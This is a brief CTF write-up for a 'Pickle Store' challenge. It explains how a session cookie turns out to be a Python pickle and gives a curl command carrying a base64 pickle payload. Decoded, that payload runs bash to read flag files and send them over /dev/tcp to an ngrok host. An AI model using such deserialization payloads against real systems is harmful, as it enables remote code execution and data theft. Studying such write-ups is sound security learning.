# Pickle Store

This was a typical CTF problem involving Python pickle deserialization. The solution flow is:

* Decode cookies that the store website set on us
* Observe that it appears to be a pickle Python object
* Create a code execution object, pickle it, and submit it to the website to be deserialized

I created [this solve script](./solve.py) to build a cookie payload, and then used curl to submit it to the website:
```sh
curl -X POST --data 'id=2' --cookie 'session=gANjcG9zaXgKc3lzdGVtCnEAWD0AAABiYXNoIC1jICJjYXQgZmwqIC9ob21lLyovZmwqID4gL2Rldi90Y3AvMC50Y3Aubmdyb2suaW8vMTkwNjAicQGFcQJScQMu' http://13.48.133.116:50000/buy
```

The payload I used requires setting up a listener via [ngrok](https://ngrok.com/).
